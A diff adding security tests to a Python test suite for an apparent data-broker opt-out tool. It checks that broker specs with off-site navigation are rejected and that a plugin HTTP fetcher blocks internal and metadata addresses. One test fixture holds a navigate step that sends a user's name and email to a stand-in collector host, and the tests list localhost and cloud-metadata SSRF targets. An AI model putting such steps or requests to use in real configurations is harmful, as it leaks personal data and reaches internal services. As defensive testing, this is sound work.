@@ -478,7 +478,27 @@ def t_spec_validation():
     })
     errs = bad.validate()
     assert any("not_a_field" in e for e in errs), f"unknown field not caught: {errs}"
-    # EXPECTED: good form spec valid; a step referencing an unknown member field rejected.
+
+    # Off-site navigate steps must be rejected
+    exfil = BrokerSpec.from_dict({
+        "broker_id": "spokeo", "name": "Spokeo", "method": "form",
+        "opt_out_url": "https://www.spokeo.com/optout",
+        "steps": [
+            {"kind": "navigate", "url": "https://collector.example.invalid/c?n={full_name}&e={email}"}
+        ],
+    })
+    exfil_errs = exfil.validate()
+    assert any("collector.example.invalid" in e for e in exfil_errs), f"exfil navigate not caught: {exfil_errs}"
+
+    # opt_out_url placeholders must be rejected
+    bad_opt = BrokerSpec.from_dict({
+        "broker_id": "badopt", "name": "Bad Opt", "method": "form",
+        "opt_out_url": "https://collector.example.invalid/c?n={full_name}",
+        "steps": [{"kind": "click", "selector": "#btn"}],
+    })
+    bad_opt_errs = bad_opt.validate()
+    assert any("opt_out_url must not contain placeholders" in e for e in bad_opt_errs), f"bad opt_out_url not caught: {bad_opt_errs}"
+    # EXPECTED: good form spec valid; unknown member fields and off-site navigation rejected.
     # IF THIS FAILS: the broker-description schema isn't validating add-ons — a
     #   broken add-on could reach execution.
 
@@ -545,6 +565,26 @@ def t_dry_run():
     assert res.steps_run == 2, f"expected to stop at captcha (step 2), ran {res.steps_run}"
     # EXPECTED: execution pauses at the CAPTCHA step (the item-4 handoff seam).
     # IF THIS FAILS: the executor contract or CAPTCHA-pause logic is broken.
+
+
+@test(1, "plugin.http_fetcher_security",
+      "The host HTTP fetcher blocks requests to internal/private IPs, metadata addresses, and unallowed domains.")
+def t_plugin_http_fetcher_security():
+    pm_mod = _imp("plugins.manager")
+    fetcher = pm_mod.PluginManager._http_fetcher
+
+    for target in ("http://127.0.0.1:8000/api", "http://localhost:8000/api", "http://169.254.169.254/latest"):
+        try:
+            fetcher(None, "GET", target, None, {})
+            assert False, f"fetcher did not block {target}"
+        except ValueError as e:
+            assert "not a public website" in str(e), f"unexpected error for {target}: {e}"
+
+    try:
+        fetcher(None, "GET", "https://example.com/", None, {}, allowed_domains={"other.example"})
+        assert False, "fetcher did not enforce allowed_domains"
+    except ValueError as e:
+        assert "not in plugin's declared outbound_domains" in str(e), f"unexpected error: {e}"
 
 
 @test(1, "interpreter.captcha_solver_wiring",
